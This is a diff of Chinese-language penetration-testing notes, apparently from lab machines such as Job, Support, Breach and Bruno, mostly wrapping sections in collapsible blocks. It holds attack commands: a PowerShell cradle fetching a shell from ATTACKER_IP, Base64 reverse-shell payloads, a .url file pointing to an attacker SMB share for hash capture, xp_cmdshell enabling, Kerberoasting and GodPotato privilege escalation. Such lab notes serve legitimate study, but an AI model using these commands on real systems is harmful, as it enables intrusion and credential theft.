@@ -8,7 +8,12 @@
 [★]$ nxc smb 10.129.234.72 -u users.txt -p users.txt --no-bruteforce --continue-on-success //同行配对--no-bruteforce
 ```
 ————————————————————————————————————
-### 总结 一样命令的区别 form Job
+### form Job
+
+<details>
+
+<summary>反shell的区别</summary>
+
 #### PowerShell 反向 shell 文件
 https://amanutkhedkar.medium.com/powershell-reverse-shell-via-social-engineering-toolkit-591ca034a12d
 #### 第一条：让“受害文档里的宏代码”去执行 PowerShell
@@ -19,8 +24,16 @@ msf6 exploit(multi/misc/openoffice_document_macro) > set cmd "powershell.exe -no
 ```
 c:\ProgramData>.\god.exe -cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.txt');"
 ```
+
+</details>
+
 ————————————————————————————————————
-#### BloodHound form Support 
+#### form Support 
+
+<details>
+
+<summary>BloodHound</summary>
+
 ```
 [★]$ sudo neo4j start
 https://github.com/SpecterOps/BloodHound-Legacy/releases
@@ -37,8 +50,16 @@ AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
 导入到 
 [~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
 ```
+
+</details>
+
 ————————————————————————————————————
-#### About WriteDacl--PowerView.ps1 && GenericAll--pyGPOAbuse From BabyTwo
+#### From BabyTwo
+
+<details>
+
+<summary>WriteDacl--PowerView.ps1 && GenericAll--pyGPOAbuse</summary>
+
 ```
 工具 revshells.com; 选择PowerShell #3(Base64);Base64 编码的 UTF-16LE PowerShell 脚本
 
@@ -55,8 +76,16 @@ https://github.com/Hackndo/pyGPOAbuse
 
 PS C:\Users\amelia.griffiths> gpupdate
 ```
+
+</details>
+
 ————————————————————————————————————
-#### .url 快捷方式配置格式 From Breach
+####  From Breach
+
+<details>
+
+<summary>.url 快捷方式配置格式</summary>
+
 ```
 [★]$ cat kavi.url
 [InternetShortcut] 					//[InternetShortcut]表示这是一个 Windows Internet Shortcut 配置文件，类似浏览器快捷方式
@@ -65,7 +94,13 @@ WorkingDirectory=hehe 				//工作目录
 IconFile=\\10.10.14.27\aasd\nc.ico 	//nc.ico 只是一个 图标文件名
 IconIndex=1 						//指定图标文件中的第几个图标,格式完整
 ```
-#### Kerberoastable Account
+
+</details>
+
+<details>
+
+<summary>Kerberoastable Account</summary>
+
 ```
 [★]$ bloodhound-python -d breach.vl -u 'julia.wong' -p 'Computer1' -dc 'BREACHDC.breach.vl'  -c all -ns 10.129.3.36 --dns-tcp
 Kerberoastable Account 中文意思：可以进行 Kerberoasting 攻击的账户
@@ -85,7 +120,13 @@ SQL (BREACH\Administrator  dbo@master)>
 
 另外刷新 Kerberos，[★]$ kdestroy
 ```
-#### mssql 启用 xp_cmdshell 功能并在目标系统内执行命令
+
+</details>
+
+<details>
+
+<summary>mssql 启用 xp_cmdshell 功能并在目标系统内执行命令</summary>
+
 ```
 SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1; //开启 SQL Server 高级配置选项，1启用
 
@@ -103,6 +144,9 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 [6]使用“GodPotato”来提升权限并获取以“nt”权限或“系统”身份的反弹shell，https://github.com/BeichenDream/GodPotato
 PS C:\Windows\tasks> .\GodPotato-NET4.exe -cmd 'powershell -exec bypass -enc <Base64Payload>'
 ```
+
+</details>
+
 ————————————————————————————————————
 #### From Bruno
 
@@ -138,6 +182,25 @@ Step 5：核心攻击（KrbRelay）
 PS C:\programdata> Expand-Archive sharpmad.zip //解压
 PS C:\programdata> ls C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe //生成.exe的默认路径
 PS C:\programdata> .\MSBuild.exe sharpmad/sharpmad/Sharpmad.csproj
+```
+
+</details>
+
+<details>
+
+<summary>FTP 目录完整和二进制文件传输完整</summary>
+
+```
+tp> binary
+200 Type set to I.
+ftp> !mkdir app
+ftp> lcd app
+Local directory now: /home/syareya55/app
+ftp> cd app
+250 CWD command successful.
+ftp> mget *
+mget changelog [anpqy?]? 
+[★]$ tar -czvf app.tar.gz app
 ```
 
 </details>
